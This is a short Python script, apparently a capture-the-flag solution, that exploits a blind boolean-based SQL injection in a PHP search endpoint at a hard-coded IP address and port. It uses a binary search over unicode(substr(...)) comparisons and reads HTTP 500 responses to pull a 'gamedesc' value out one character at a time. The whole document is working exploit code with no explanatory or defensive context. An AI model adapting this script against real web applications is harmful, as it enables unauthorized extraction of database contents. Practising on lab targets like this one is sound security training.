import http.client

url = "/Controllers/Handlers/SearchHandler.php"
headers = {"Content-type": "application/x-www-form-urlencoded", "Transfer-Encoding": "chunked"}

def sqli(conn, pos, mid):
    payload = f"search=6%27%20AND%20unicode(substr(gamedesc,{pos},1))>{mid}%20--%20-"
    conn.request("POST", url, body=payload, headers=headers)
    response = conn.getresponse()
    return response.status != 500

def get_char(conn, pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(conn, pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

conn = http.client.HTTPConnection("94.237.55.163", 37788)

flag = ''
for i in range(1, 15):
    flag += get_char(conn, i)
    print(flag)

conn.close()

